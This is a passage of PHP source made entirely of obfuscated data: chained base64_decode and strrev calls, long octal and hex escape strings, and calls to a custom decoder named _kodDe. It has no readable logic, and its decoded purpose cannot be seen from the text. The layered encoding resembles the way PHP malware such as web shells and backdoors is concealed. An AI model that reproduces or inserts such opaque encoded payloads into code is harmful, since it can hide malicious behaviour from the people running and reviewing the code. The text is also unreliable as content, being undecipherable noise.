MwhQvztZYrf2KVh4cEQpTtA==').base64_decode('KvxhH13kPi2djrJrWDlcnVUWLtauiGiv8aqkWO3sgXxe6Le441MWoYtbLiRDpizWRQ==')."\x4e\xb3\xec\x32\xb9\x16\x8c\x9f\x63\xa6\xe6\xcd\xdd\xd7\xac\x4e\x82\x3c\x35\xcf\xc2\x96\xa0\xfb\xc8\xc1\xa7\xb1\x76\x1c\xed\xce\x1d\x39\xa3\xa8\x33\x99\x4b\xc6\x28\x5b\xb5\x28\xd3\xff\x67\xe6\xb8".strrev(':_-099i~¤b©àíª"€?fé=Fø‰AV²àh|º#›ŠÆ†$šp]'."\n".'™'."\n".'ñäz').base64_decode('eGMKRX3WFDjrzqczSTShgWN8P5UL4SQ8l3Klgof7hPy8csHPyfkQ7uKEqdrKknktOw==').base64_decode('nt9y+Uf30/DT92256Q9nQ1v00fTwCPDbRPgDAiChvXvm2k3m9Me+3L1l8rD6Cz4fPA==')."\330\210\235\60\363\47\77\372\122\174\262\347\322\206\357\274\172\342\167\276\161\376\241\117\74\320\366\217\47\37\332\371\227\227\256\353\371\361\307\217\345\256\136\164\352\17\172\116\74".base64_decode('6pZzj9z2+/29zzx6yDN1gcPf3pm4cPLcN15c9sYFd8cCz7zx5NNvPP3kx3uGf7ts/A==')."\365\307\17\275\356\301\371\235\143\237\351\73\64\262\377\276\35\177\373\314\111\127\254\170\70\371\314\216\361\3\363\107\116\373\302\274\305\137\34\73\331\137\372\340\317\35\277\170\46"."\362\324\237\16\377\317\316\336\3\376\226\134\272\147\356\312\277\275\162\330\341\221\37\334\366\304\376\347\376\366\363\207\365\205\167\15\377\343\242\33\117\76\167\305\27\343\107\137\262".strrev('¹_?ôªå~?{íèû¦·Å¢ıÜtĞ:<]è×Yá{z}èœ.çÙÿ¼nGâ`o¨').base64_decode('If6Xr2z73WMr5183b0lh2ctG5d453rbHp0323HnzgmsyP+ku/O3DxlvDua99cH6gOA==')."\xf4\x99\x15\xed\xc7\x69\x7b\xa6\x7b\x9b\xe\xda\xf7\xaf\x6b\xfe\xfe\x87\x6f\x7f\xf6\xdc\xe9\x57\x4f\x7f\xf4\x5b\x97\xbd\xbd\xf1\xbb\x87\x7a\x77\xde\x7c\xf0\xf4\x46\xeb\xac\xec\x86\xcf\xfd\x63\xd6".base64_decode('GRuGzrU2rv/cnotK92W/1/zLTa/mflduuHtl108Ts780fe+yMyP1f7jc+ujsHV84JA==')."\374\207\371\373\246\267\267\35\360\324\137\17\70\346\57\263\27\314\134\66\231\254\34\270\351\320\323\317\331\164\332\233\321\346\346\115\373\35\136\167\210\375\331\145\167\345\137\335\361"."\303\355\371\151\207\375\343\347\207\335\173\107\373\331\351\237\114\177\354\210\115\241\374\202\363\217\130\167\331\161\177\331\345\253\34\166\363\201\137\157\251\177\153\261\175\332\371\37\132".strrev('¶r>/ùş}ß½óy¸ÎUmû[î÷?ıæÅá´²6f›ägµv[Óm†Œ×ù…û}Ñ').base64_decode('d9sPb1y/c97u1UdFLnz+KwubWnanDlz9638mx+rzC/c78+Dw15VLF771x+DRVxyavw==')."\375\234\374\76\337\135\3\367\246\126\371\366\173\344\252\265\353\366\64\275\240\147\222\13\117\335\163\334\274\75\137\130\171\325\365\351\65\137\376\134\347\375\237\217\176\155\232\366\304".base64_decode('yGPG01vWrRzzDUa397x1aes5O756xbd/8PoF3XvN1kx9ONJyQ91pTeqz+W8c1Dft9g==').base64_decode('V6xHb396/Mnfj128rG/728MrDrolcPqK+5/8vXLwN4rj37vpokcP3XbQ1zq//k7iSw==')."\x4f\xae\x6d\xfd\x65\xb4\x67\x75\xf7\x82\x96\xa3\x7e\xfe\xfe\xac\x87\xf7\xec\xf7\xd9\x59\xc7\xe5\xb7\xbc\xf0\xcd\x9b\xf\xfb\xf5\xa2\x3f\x9e\xf6\xf9\x1b\x7f\x7d\xff\xf4\x7\x1e\xfd\xf9\x6d\xfa\xa1"."\147\46\57\212\355\74\166\143\335\375\336\303\156\270\364\267\223\276\303\327\155\74\327\277\352\264\143\217\277\357\302\307\16\367\64\77\321\377\140\303\307\357\317\133\131\371\323\31\207".base64_decode('XPGLrZef/afgMWf4XzpWO+rhK9+98uKJmPHt45+enmo+0CrHnmp4YdbRJ9ZdcM4Z/w==')."\365\374\21\363\67\74\360\375\371\267\116\334\367\207\227\277\332\35\170\165\356\205\177\174\161\307\21\307\166\154\373\316\253\157\356\177\352\335\277\72\173\313\257\16\172\365\222\213\277".base64_decode('89kf/ujO05+/sX6OZ+emjdPvMG/96Mmvtepfv3baaTtPOWDG9078+w0vPDtn2+q9nQ==')."\346\310\242\67\177\360\360\266\367\132\257\375\70\371\112\373\317\217\75\71\376\144\347\273\207\374\340\267\37\254\365\155\371\355\105\351\167\277\375\313\255\7\35\374\302\375\267\306\362"."\x37\x1c\xd9\xbe\xed\x5f\x8b\xa\xc5\xdf\x1e\xee\xbb\x61\x78\x86\xfe\xdf\x67\xfd\xf3\x87\x43\x7\x5e\x7c\xfd\x81\xdd\x7\x1c\xaa\x7f\x27\x76\xd2\x40\xdb\x6b\x9f\xf9\x5d\xfa\xe8\x45\x87\x8c\xdc\xf5".base64_decode('hXf3bP3i137vSX7ztm9ce/RzP82csuqn15x81+8Tf1i1yvNsQ9NtO/e90njCzn8OrQ==')."\xee\x7e\x7e\x8b\x76\xe0\x83\x99\x17\xb6\x1c\xf1\xb7\x47\xc6\xf\xb0\xff\xb3\xa9\xf3\xd5\x73\xee\xbd\xfb\x6f\xa7\xfc\x27\xf6\xf7\x89\xbb\x7e\x79\x79\xea\xe8\xc8\x82\xa6\x3f\x8f\x3f\xfe\xfe\xf1\x7d"."\77\365\134\165\257\376\341\302\304\23\312\113\255\135\75\333\355\317\36\376\315\307\167\276\372\277\176\176\301\325\117\75\177\144\327\335\357\237\377\352\15\223\43\353\267\175\375\237\361".base64_decode('xQ+9/KPXHnvnuh9+OHd/b8+uzQ/8+5Q1b/5p+jsnP1Q/7+j9nrts8d0vPPuhJ/32Xw==')."\213\67\275\170\333\175\337\271\350\360\355\211\57\137\170\307\176\317\354\167\164\307\231\167\337\267\245\362\136\106\173\161\305\242\303\146\155\155\273\377\36\363\233\127\175\60\66\357\202"."\43\317\15\236\360\333\75\53\267\276\173\354\360\161\13\57\34\335\66\347\225\266\321\261\216\35\323\374\47\275\365\130\173\361\314\312\227\376\73\322\176\226\157\365\115\77\371\271\157"."\366\21\333\106\315\341\17\337\350\175\304\263\365\250\125\267\316\31\172\363\266\7\247\357\75\270\147\343\337\16\372\323\246\263\137\370\365\355\327\255\377\350\255\275\153\156\377\170\342".base64_decode('nQ9f23399ae899Gv//T6c2+qD3381492L396+cTwWx+oPvXh+z/6t//IXb96oG3XFw==')."\117\175\377\57\373\375\364\337\227\374\340\345\267\337\17\306\147\375\360\242\131\245\213\53\307\353\357\37\367\134\307\212\37\334\165\372\227\337\275\356\316\147\36\77\244\311\63\276\377"."\x82\xcf\xad\x7f\xfd\xd1\xfd\xf6\x7f\x74\xd1\x19\x7f\x5e\x69\xf7\x78\xdf\x7d\xf9\x97\x7f\xdf\xea\x9d\xae\x25\xaf\xff\x45\x22\x75\xdb\xbc\xb5\x9d\xc3\xc7\x5c\xd4\x3e\x6d\xe6\x95\x7f\xfe\x6c\x77\xf7"."\x9d\x5b\x6f\x49\xdc\xdc\x67\x3f\x77\xf7\xac\x43\xe7\xbe\xb9\x6d\x6b\xdb\x49\xf\xdc\xf3\xe3\xcb\xad\xba\x17\x8f\x3c\xe7\xf5\xb\x57\x3f\xbb\xfa\xbd\xf7\x8e\x39\x69\x5b\xfe\xca\xb\x77\xe8\xdd\xef"."\x1d\xab\x7e\xe3\xf1\xd2\xae\x86\xc7\x7d\xab\x1f\x5f\xf4\x7c\xe3\xa3\xbf\xb9\xbd\xeb\x87\xe7\xb4\x68\xbe\x85\x5f\xb8\x78\xa8\xb3\xff\xa9\xf4\x19\x5f\xbd\xf2\xbc\xad\x91\xad\x9b\x9f\x3e\xe4\x8a\xe9"."\237\75\361\306\63\276\177\300\31\307\176\151\347\327\216\232\345\233\176\117\343\272\325\177\172\351\243\47\257\330\270\145\257\326\276\143\344\27\357\277\370\101\363\41\366\27\74\57\334"."\142\175\377\217\63\16\212\334\373\257\173\137\266\137\375\313\77\26\277\373\317\123\175\305\57\276\362\370\140\317\121\377\72\347\352\305\251\223\255\131\217\135\370\270\347\372\35\47\375"."\x62\xc3\xc6\x8b\x36\x5d\xf6\xe1\xe9\x8f\x6e\xb8\xfd\x9a\x2d\x77\xdd\xf5\x15\xef\xa2\xad\xc7\x3d\x3d\x6d\xe7\xb5\xf\xdd\xf5\xd4\xf7\xe7\x5e\x91\x7f\x67\xe0\xda\xbf\x6a\x33\xba\x8f\xd9\xd7\xd0\x1d"."\175\143\367\334\247\323\255\127\277\75\362\327\315\57\336\272\160\343\1\231\131\323\27\217\232\367\335\275\343\256\334\233\27\275\174\127\305\52\124\156\32\34\72\173\326\151\261\127\22".strrev(';Æó¶bÙ§ËÈå±ß<vïàşÿï[Çy\\—;éxœ÷›ùOy´]—Wş­qÎû¸}ß')."\223\17\164\155\277\343\303\353\156\271\344\325\355\377\153\307\214\217\36\155\315\314\77\371\277\374\177\74\346\303\43\56\332\30\334\120\371\355\262\225\277\331\117\251\333\347\171\366\57"."\167\35\162\346\177\307\225\272\302\141\47\14\274\263\340\207\263\103\255\37\227\316\372\373\165\373\67\376\367\373\215\255\323\176\163\311\366\13\216\377\312\330\145\235\277\352\375\136\333"."\135\57\256\124\116\337\231\376\173\366\233\277\374\326\243\313\172\16\12\34\363\373\243\142\357\33\63\26\154\72\345\261\73\57\365\55\272\152\164\60\375\304\317\307\324\105\165\347\35"."\265\355\245\213\257\274\364\236\223\172\375\277\54\133\373\176\374\273\367\166\37\252\57\272\244\367\320\153\306\317\76\360\234\343\132\246\317\232\361\225\272\236\370\226\317\14\236\266\347"."\xe1\xbf\x67\x5f\x78\xef\xa6\xab\x3b\x87\xff\x98\xfe\xda\x8f\xbf\x7a\xde\xfd\xdf\x58\x76\xed\xc0\x71\x47\xaf\x1d\xdf\x7e\x8f\xb6\xe7\x2f\xdb\x7f\xbc\xff\x91\xdf\x7f\xf5\x7b\xe9\x2b\xbd\x3d\x57\x3c"."\261\365\362\337\174\347\336\215\227\76\371\124\340\107\231\374\366\77\76\371\367\371\67\277\67\132\316\236\165\367\107\312\1\367\277\377\376\330\246\261\345\173\57\133\361\213\227\226\276"."\xb4\xf3\x56\xbb\x3e\x77\xd2\xa3\x13\xf\xed\xb8\x62\xec\xc3\xb3\x5f\x7b\xe5\xd8\xe8\x21\xb\x9f\xda\xf4\xc6\x5\xf3\x97\x7c\xa5\x74\xfe\x1d\x3\xd\x6f\xbc\xf1\xdc\x31\xbb\xb7\xfd\xe9\x9e\xee\xb"."\x3b\xd7\x9d\x74\xda\xb6\x37\x67\x7c\x75\xe7\xbd\xf3\x9f\x6b\x3b\xe0\xf1\xc3\x67\xfc\x7e\xfa\xea\xf4\xbe\x7f\xfc\x64\xc6\xc1\xbb\x52\x97\x1f\x7a\xd3\xe0\xb4\x3b\xc6\x43\xef\xed\xba\xf3\x86\x7b\x8e"."\330\165\350\356\333\36\74\72\270\267\264\266\357\265\366\246\163\222\107\134\177\347\353\177\175\370\340\346\342\217\217\375\307\126\357\115\347\134\372\325\377\44\327\255\131\334\223\271\357"."\x96\xe9\x91\x9b\x5a\xd6\x1d\xe5\xbb\xfe\x3f\xff\x7e\xf5\x85\x35\x47\xfd\xec\xdf\xaf\xfe\xf5\x9\xf5\xba\x53\x3f\x7a\xea\x83\x53\x4f\xb1\x3e\x7e\xfc\xe6\xcb\xaf\x5f\xfa\xc0\xfb\x8f\x2c\xff\xd9\xa6"."\xb7\x5e\xf8\xe0\x2e\xff\x23\x2d\x93\xef\xbc\xfd\xc1\xee\x9f\x3d\x7c\xf0\xa9\x3f\xfb\xf7\x8e\xdd\xb7\x5e\x7e\xf9\xf5\x9b\xed\x8f\x5f\x7f\xf9\xda\x53\x3f\x7c\x6b\xf7\xc2\x53\x1f\xf8\xf0\xbd\xbd\xff"."\371\367\207\137\72\371\212\140\333\307\247\315\77\241\355\200\47\27\277\376\307\311\143\236\175\160\372\150\361\301\107\236\173\351\203\25\357\117\76\160\322\255\13\107\106\256\336\364\257"."\155\247\217\334\274\351\371\35\37\166\77\126\377\336\33\313\77\363\331\107\316\170\266\224\136\176\334\214\307\176\375\322\31\357\317\133\164\355\323\173\262\77\375\150\342\173\153\377\353"."\371\77\317\316\276\361\121\337\332\331\57\255\74\341\304\145\347\35\377\366\347\256\333\175\132\323\161\257\37\371\245\43\137\74\361\255\231\363\276\366\174\313\202\103\16\152\271\174\361"."\101\367\17\77\65\137\133\364\237\157\154\371\312\271\127\335\175\4\263\66\132\320\2\6\21\25\335\30\336\70\4\67\112\331\341\324\130\276\304\64\245\52\31\133\313\201\20\17\324"."\167\212\343\332\150\146\14\30\254\226\346\305\64\140\26\107\62\205\44\134\4\67\103\1\320\326\113\215\156\34\32\146\306\54\40\25\236\327\14\222\267\362\320\330\210\241\203\4\1".base64_decode('YPPnQsBOm1ayBEeGQhodB4aBQc6UR7JaEtjdiWSuYA2BVGrhArgUHs3qebvElPSGSw==').base64_decode('6XwKepKdyBSKFjTW0Cw9VQAd0+bFUHjhwnlslCAwbzF0ay5oNI2irw7loeBC1p/KkA==').base64_decode('XdbYwbsFahvOJs0S4zdh1Oc3wdBljeLwSHkCxjGZt9NMfdUcG7E0dnk9b9FC+G7RLg==')."\131\71\200\266\54\200\132\346\67\303\267\346\316\205\174\13\27\101\322\334\46\150\33\33\231\26\350\101\56\133\34\35\51\17\303\70\244\63\345\274\305\114\36\162\171\113\143\223\274".base64_decode('oAVqrOTKI6YOiJIsGRUtP8HGhGFHKrNRK8CgL2JD1bIIvlwybH1ohB9tNmaKNnx+wQ==')."\74\30\227\322\304\250\121\36\202\231\135\260\30\372\320\322\4\37\110\153\306\110\246\4\163\75\167\61\240\223\136\116\227\162\303\320\262\322\150\272\222\141\126\73\266\76\222\36\32"."\x1d\x67\xb3\xc4\x86\x64\x3e\x54\x67\x8c\x25\xc7\x4b\x15\x86\x3a\xac\x99\xe9\x9c\xbe\x31\xcf\xaa\x5b\xd8\x4\xdd\x5f\x34\x1f\x4a\x97\xb2\x63\x56\x7e\x18\xea\xcc\x4f\x68\x46\x89\xd\x95\x35\x66\xe8"."\346\70\140\263\146\32\225\215\66\314\372\204\66\254\247\31\302\16\245\106\254\234\11\303\240\215\345\307\163\66\340\321\374\205\254\11\266\265\161\224\325\224\325\107\214\341\42\214\365"."\xc2\xf9\xb0\xae\xb4\x11\x7d\xc2\xce\x40\x2d\x2d\x73\xa1\x47\x2d\x6c\xb6\x9a\x17\x42\x3e\x63\x74\x68\xc2\x1a\x87\x99\x1d\x49\xe6\x35\x3b\x7\xed\x18\xd3\xc6\x6d\x93\xd5\x3b\x7f\x1e\xa0\x89\x39\x92"."\x49\xe\x31\x7b\xc3\x79\x6c\x6\x4a\xd6\x88\x36\xb6\x11\x8e\xe7\xa9\xa2\x35\x3a\xc2\x26\x49\x4b\x95\xb3\x63\xec\xb8\x36\x77\x21\x4c\xc9\xf0\xa8\x96\x4e\x19\xec\x7a\x2b\x63\xe5\x47\x98\x76\x47\x6e"."\x68\x58\xab\x8c\x43\xfd\x13\xa9\xe2\xc8\x90\x1\x9d\x58\xcc\x96\x5f\x21\x9d\xca\xe6\x98\x7e\xbf\x31\x36\x9c\xcd\x67\x80\x7e\x2c\x14\xe8\xd\xc8\x35\x3e\xac\x8f\xe6\xb3\x19\x86\xda\x0\x5d\xd4\xb4"."\x88\xa1\xb2\x6e\x4c\xc\x5b\x6c\x78\x19\x66\x2\x7e\xb1\xec\xb\x17\xc2\xea\xce\x64\x11\x29\x19\x81\xe9\x9c\xdf\xc4\xc8\x15\xe4\xb7\xad\xac\x56\x19\x62\x73\x35\x17\xa0\x13\xc9\x8d\x76\x29\x3\x43"."\63\224\257\24\307\67\116\60\224\151\142\10\7\203\333\302\326\351\104\251\154\245\307\67\302\134\315\343\15\142\153\224\221\233\261\114\252\234\143\15\332\70\226\31\237\320\230\321\127"."\105\37\62\55\30\272\241\321\124\266\60\2\55\133\60\17\220\301\32\61\155\103\203\54\146\271\220\312\161\101\243\231\316\15\61\102\263\160\41\114\62\327\155\155\327\122\103\114\326".strrev('À!IX\'oNVBè(Ü¤(â…²²Ã”)t†ÈBÛ%$‰@zrõÈ­}ee²ˆ+,')._kodDe('LwgRZDg282HSmBwckZIUEoddJFSKm53EMWvPdKeoLdqaO/mmioy1txYcdsNashv8f4g=')._kodDe('MkDVmMoJkJKhen8lJnWAyB2FFcwVCpQ2c28j8iU1FzkSD4EiKjXILlXslcLLDZj4i+I=')."\xca\xa9\x46\x11\xb5\x22\x9f\xf7\x39\x6d\x79\x55\xf2\x7\xc6\x80\xda\x8b\x5a\x58\x1\xba\x28\x6e\xc8\xad\x21\x69\xe0\xb1\x11\x6e\x7f\x9f\x9a\x8\xc4\x57\x49\xba\x82\xd8\x48\x94\xa1\x93\x2a\xd4\xf7".base64_decode('pW6JGqRxlGfQOQQMQ/bd/sDuC7+757I79px/2+77L9l32x27H7oMRXdtv2D3bde9dg==')."\345\231\273\266\237\277\153\373\151\373\316\272\373\315\7\317\333\175\341\355\373\116\177\150\367\65\267\354\376\301\131\273\36\170\150\337\317\316\332\173\313\271\273\266\157\333\163\315\267"."\x77\x9f\x79\xef\xae\x7\xbe\xbb\xfb\xec\x1b\x76\x9f\x75\xe1\x9e\x4b\xce\xdf\xf5\xd0\x35\x28\xff\x9e\xb3\x45\xcd\x28\xdb\xee\x6d\x57\xe0\xb2\xf\x7e\x73\xf7\xf6\xed\xfb\xbe\x77\xb\x4f\x7d\xf3\xc1".strrev('¥è³E¿¡¦5¢lV^œìÅµ„53‹AXF¼¾”ùn¤ '."\n".'e”td`'."\n".'e­¶6ët À°-')."\x8\x47\xed\x96\x2d\xc5\x28\xe2\x64\x85\xcd\x8d\x8f\x23\x65\x42\x2f\x94\x30\x6a\xc1\x28\xf9\xa9\x25\xa3\xc3\x4e\x40\xc2\xbf\x5a\xc3\x4c\x13\x6a\xa0\x15\x1e\x6b\x31\x57\xd\x38\x8\x57\x7e\x58\xca"."\250\144\64\4\110\267\52\31\124\114\141\326\106\212\155\262\160\141\234\117\272\153\21\324\234\126\336\14\66\265\131\56\354\27\62\150\150\230\144\0\102\357\161\252\120\212\254\52\47".strrev('¹DÖ³–ùå/Y~nLkËè]€ùX»fœV¢¹'."\n".'<ShQà¬¢bB#œ“‘1\'7¬pI')."\x35\xf2\xfd\xb8\xab\x6b\xf1\x1a\xc3\xc8\x3b\xe7\x48\x44\xeb\xba\x62\xd7\xc8\x28\x8f\xb6\x2c\x94\x36\xcc\x8e\x3c\x22\x74\xe2\xe6\x94\xa8\xf\x88\x6e\xd0\xa8\x10\x86\xa3\xf\x71\x3a\x59\xd6\xd3\x6"."\323\162\326\13\44\47\320\107\237\164\25\105\155\175\270\252\165\12\55\207\262\343\126\155\351\362\122\256\204\135\42\330\113\226\203\241\65\263\330\222\332\0\141\141\273\44\103\363\356"._kodDe('LymKZ63KKbYUJ/OaStrGE4Qxu/y2j3ZgKXw+ME+hq3GWYWb9tNOjSKKhzHhKktw2ITA=').strrev(''."\n".'(3ÌRªQpš“i]K)ZZŞ-ƒÍôÌä‹Š0ƒĞX1 ¢ûæ8²Fkä]'."\r".'').base64_decode('oiyxShHPdquzz3oxLRVaoqVsqVY1A4PqE+OhzRHpevp4mBhplEYhAyvb68QB1H8vRw==')."\xb\x34\xbd\x88\x75\x48\x5b\x44\x43\x16\x76\x1f\xa8\xd2\x92\x2c\xc7\x63\x2\xa3\x70\x71\x32\x5c\x9f\x50\xd4\x96\xa7\xbc\x84\xd8\x93\x22\x57\x8d\xb5\xf2\x1a\xbb\x1\xb5\xb0\xa5\x49\x51\xe7\xf8\x57"."\261\204\175\200\46\250\11\16\211\145\116\123\260\21\155\210\61\266\266\135\122\21\17\140\111\371\325\254\156\253\300\26\101\273\333\3\361\120\207\332\27\140\166\44\132\251\344\267\322"."\x43\x96\x1f\x6b\x79\x1a\x23\x7a\xd8\x48\xfa\xb1\x95\x3a\xc6\x50\x1f\xb7\xe3\x26\xbb\x83\x8a\xce\xbc\x65\x9b\x8d\x1f\x5a\x37\x6a\x9a\xf1\xce\xe1\x50\xbb\xda\x19\x8a\x49\x5f\x2e\x55\xdc\x5f\x96\x1d"."\211\4\372\102\152\74\36\225\332\101\54\142\327\252\253\242\235\152\107\64\272\52\4\113\2\220\240\125\242\340\330\230\120\334\266\343\230\60\52\304\127\127\262\342\235\314\42\141\117"."\17\230\15\210\53\240\240\212\326\136\107\117\40\306\315\2\346\373\232\174\315\42\57\372\240\212\255\43\332\230\15\171\74\21\210\325\360\367\101\375\200\0\202\200\357\17\50\320\23"."\x5d\xa3\x74\x44\xc3\xfd\xbd\x91\x38\x75\x73\x41\xe1\x91\xa8\x94\x4e\x94\xbf\x21\x99\x79\x3\xa9\x4e\x86\xea\x83\x7d\xe1\x40\x47\x50\x9\x45\x12\x51\x66\xdd\xc1\xf5\x6f\x89\x5d\x4f\x9c\xc7\xd9\x10".strrev('Ò‡•¯t\'_Héä1‘øëZ'."\r".'ğn66gëêx'."\r".'I`šò5ÉÛ"4ò€û{-”').base64_decode('FuBRbzx+ItgiRmOBjjBrCsJKCEY7QjSw99Kf7Lr/gr1X37b72+ejivZc9c09l9+LWA==').base64_decode('KMw23Xbe3ocv2HPp7XvO2wLt33f7fbse+tneS2/ZfdsVe777071XnUETXvvRT3afcw==')."\xb\x6f\x98\xf2\xda\x25\xf\xef\xb9\xe0\x26\xce\x4a\x51\xe\xca\x83\x4a\xbf\x76\xe6\xf9\x7b\x1f\xba\xd\x33\x52\x37\x9e\xb6\xe7\x9e\x73\xf7\x5c\x73\xfe\xee\x73\xbe\xb7\xfb\xca\x5b\xf6\x5e\x70\xfb"."\xee\xef\x9f\xbe\xfb\x5b\xe7\xef\xbb\xfd\xb2\xe3\xdd\x88\x44\xe3\x3\x6c\x2a\xc0\xb0\xd9\x7f\x32\xb6\xe3\xa6\xc3\x3b\x68\xcd\xc1\x43\xdb\x88\x7e\x1b\xb0\xb1\x8\xfa\x65\x3a\xef\x44\xf\xfa\xc4\xfe"."\140\244\43\350\66\276\222\243\340\52\145\66\305\20\252\371\3\134\257\5\256\126\130\234\370\127\150\253\237\262\25\223\60\377\122\243\244\306\164\6\343\35\261\120\173\20\314\21\370"."\104\315\44\174\37\50\204\40\150\74\266\232\207\271\71\151\225\153\33\245\201\41\163\243\342\350\210\346\113\231\371\112\241\110\32\253\324\141\225\264\72\17\246\66\304\22\114\251\303"."\173\73\2\350\51\264\364\32\260\367\13\242\316\134\277\256\336\323\344\151\156\124\300\357\15\55\1\336\156\224\72\320\212\347\345\34\37\361\44\35\261\146\117\123\243\122\127\32\252"."\203\166\211\161\105\255\127\151\116\113\321\74\15\320\140\271\271\42\57\242\146\226\135\326\14\104\336\224\224\207\203\170\171\364\353\360\140\223\362\211\22\164\236\120\16\67\114\11\104".strrev('´~¡C‚Ôß>n¾‰Ğa£9´`Ç1I5F	%Fúæ›ÜÙòšM¢z¾›ã©9:')."\x59\x9a\xc5\x26\xa\xa0\x64\xaa\x30\x94\xce\x16\xcb\x6b\xa2\x6e\xa0\xc9\xa1\xf9\x51\x80\xa7\x60\x5b\x7\x5e\x13\x22\x47\x3c\x81\xcd\x20\x86\xf3\x49\xac\x91\x46\x3c\x12\xd5\x51\xde\x94\xf6\xb3\x60"."\x65\x19\xa9\x3\x3b\xf5\xde\x75\xbc\xf\xc\x97\x61\xa\x74\xe1\xcf\x8\x9b\x2a\x6\x13\x1d\x3d\x14\xcb\xe3\x12\x9a\xa7\x93\x33\x1d\x88\x2a\x86\x53\x71\xa0\x8\x3f\xe0\x40\x3e\xba\x5c\x30\x41\x38".base64_decode('kOQLRbqisV5qohfv6An2BnxAxCkm0PyY61PalHpM+Sio3jH85ENsyBLkq2hdqTZi4Q==').base64_decode('6CiUstAYmH2FGNxrpEhbPfUYAlVyx1vRWEJFAwDkWaK69dJuIam+Y0uzEe5TBrs1YQ==')."\52\150\210\77\63\231\323\224\164\222\371\352\102\37\302\365\167\104\43\135\41\146\231\330\311\4\243\151\323\221\251\63\26\302\276\47\240\55\12\253\112\262\7\105\21\241\212\202\42".strrev('¢?náäé¯˜)gÒ(à°XxGßÃ9%Îá¶"(ÿï84Ñ¥')."\61\51\22\210\5\172\343\74\32\133\303\55\134\70\214\132\272\250\221\376\136\101\375\303\201\325\10\161\242\154\354\331\31\311\177\162\203\157\366\362\306\101\152\74\110\203\364\147\5".base64_decode('i2GDqvWbmj3Kgs2NkIe7kbBzaJpU8ZUTw2o42k3jxNlZsJgWJyZlQEEMeUIw5Bbbxg==')."\370\312\120\20\76\53\324\42\131\211\104\327\4\204\377\54\51\1\40\302\235\226\377\344\201\301\321\101\37\142\34\254\15\302\30\260\263\135\141\54\111\7\221\70\120\301\4\224\16"."\xb0\x2d\x75\x83\x7\x76\xf\x35\x6f\x66\x99\xe7\x1b\x44\x1c\x27\x81\x75\xa0\xbf\x6b\x59\x80\xd0\x4d\x28\x80\x8e\xe1\xa5\x3c\xb3\xa\xa4\xe6\x88\xea\xe0\xe4\xe0\xac\x41\xaf\x8f\x5a\x60\x62\x46\x66".strrev('LNíıdâx3\'ÆÖ]ª°)p™Àü)di‚º!	zÔ!Äª˜w6ı¢×¤š#Ğ')."\xd1\xdf\x30\xfa\x9\x27\xd0\x74\x19\x3c\x3\x5a\x9e\xe1\xd0\xaa\xe0\x24\xfe\x47\x24\x34\xf2\x81\xa4\x86\x56\xce\x2\xa1\xc8\x24\xfa\x17\x11\x9b\xc9\x50\xc4\x5d\x59\x7b\x30\xb1\x26\x18\xa4\x19\x58".strrev('rLwˆ~Ã×4\'õ'."\r".'Wp¾õoÕUsõŞ˜2ÕVª'."\n".'ÂÉ'."\0".'õl<3’« |DVE~')."\x4a\xec\x40\x88\x6a\x5c\x20\x36\xa\x4e\x44\xe0\x2e\xde\x20\xde\x1d\x8b\xf6\xf7\x49\xf1\x9e\xc0\xea\x50\xa4\x9b\xc5\xfc\xb3\x59\x68\x36\x54\xad\x74\x86\xe2\x68\x88\x3a\x18\x32\xa\xcf\x73\x72\x9c".base64_decode('himLJHPADpTuRFQeRST2HR8MKJV2rrL2/lC4U7aYxxlpaCah8LC/zGSNY3FiO88ieA==')."\310\131\230\240\33\213\220\61\140\21\72\0\54\106\206\213\105\210\207\73\26\41\35\145\21\174\122\11\106\130\32\72\273\242\163\47\73\220\346\264\21\156\362\271\44\235\224\374\160"."\140\32\354\243\262\74\354\215\5\235\350\64\56\161\165\211\153\211\344\114\22\110\120\265\105\105\262\74\367\123\20\342\74\11\20\375\16\156\130\116\70\343\15\14\61\251\171\263\235"."\60\354\274\343\53\140\6\211\276\22\42\266\247\322\167\140\157\247\162\112\325\224\144\345\144\323\226\1\102\62\106\5\353\40\204\26\2\46\254\256\111\304\323\64\352\74\116\161\272"."\xb4\x81\x9f\x92\xc0\x37\x88\x7\x7e\xa1\x45\x7\xd3\x9f\x41\x88\x32\x61\xa\xd8\xfe\xd4\x7b\x60\xc3\x65\xf6\x22\xce\x93\xf2\xe0\x60\xdd\x54\xa3\x5\x19\xd8\x98\x41\xb4\x8e\x46\x59\x29\x18\x48\xb4"."\347\245\162\330\237\213\152\27\230\140\236\34\324\204\10\234\212\321\105\274\63\26\355\243\334\210\22\352\122\250\23\11\245\236\12\336\353\201\315\352\210\5\361\352\240\271\130\132\103"."\xbd\x43\x4c\xb6\xac\x5e\x1\x8b\xf2\x46\x67\xa9\x50\xa4\x33\xb8\x56\xa9\x37\xd2\x63\xaa\xa6\xa9\x50\x58\x41\x6b\x91\x55\xa4\x54\xd5\xc4\x6a\xa0\x6d\x85\xab\x2a\x2b\x67\x8e\x2a\x32\x7a\xb1\xb3\x73"."\x7\x85\x25\x4\xca\x55\xb1\x69\xc4\x1d\x4\xb3\xde\xf5\xc0\x1\x9d\xa7\x50\xee\x98\x26\x85\xe2\x68\xc3\xe\x87\x49\x4f\x51\x92\x61\x61\xa6\xd6\xa3\x70\xaf\xd\x18\x88\xf\x22\x54\x14\xb\x15\xb1"."\x4\x5a\x11\x4d\xa\xae\x4d\xc4\x2\x18\x48\x38\xd1\x69\x7\xa2\x3f\x84\xa0\xe0\x93\x52\xb9\xa0\x51\x93\x56\xc2\xbf\xf9\x36\x80\xc0\x60\x83\x83\x5d\xa4\x8c\x24\x66\x18\x1\x83\xc8\x96\x27\xf5\x89"."\247\20\251\1\35\146\131\246\260\12\70\160\32\353\213\205\172\3\261\165\60\144\342\74\0\53\320\314\73\14\233\105\304\260\372\45\323\372\10\152\265\154\152\117\347\170\222\121\130"."\164\266\235\4\12\213\132\3\13\0\317\74\15\202\103\122\225\133\116\63\201\112\3\263\100\366\260\0\363\140\101\254\272\230\4\255\200\110\16\217\211\131\3\334\207\131\221\123\145"."\273\64\341\61\25\157\222\170\222\141\1\4\273\2\375\141\31\2\103\245\254\12\256\373\204\65\302\132\132\153\215\260\64\46\232\341\253\15\372\323\60\37\372\107\235\152\64\264\240"."\xf3\x69\xa5\x88\xbd\xc6\x70\xef\x8c\xd0\x2a\x1a\xb\xf4\x27\xa2\x2a\xda\x3f\x62\x41\x4c\xcd\xa1\x47\x7c\x58\xa5\xf6\x4a\x67\x70\x79\x52\xa0\x1a\x9c\x81\xbb\x9f\xfd\x84\xae\xb1\x3c\xb5\xba\xc6\xcb"."\x73\x29\x54\x30\xd2\x1d\x8a\x4\xdb\x7a\xc7\x43\xf1\x40\xaf\xc2\x1a\xe\x72\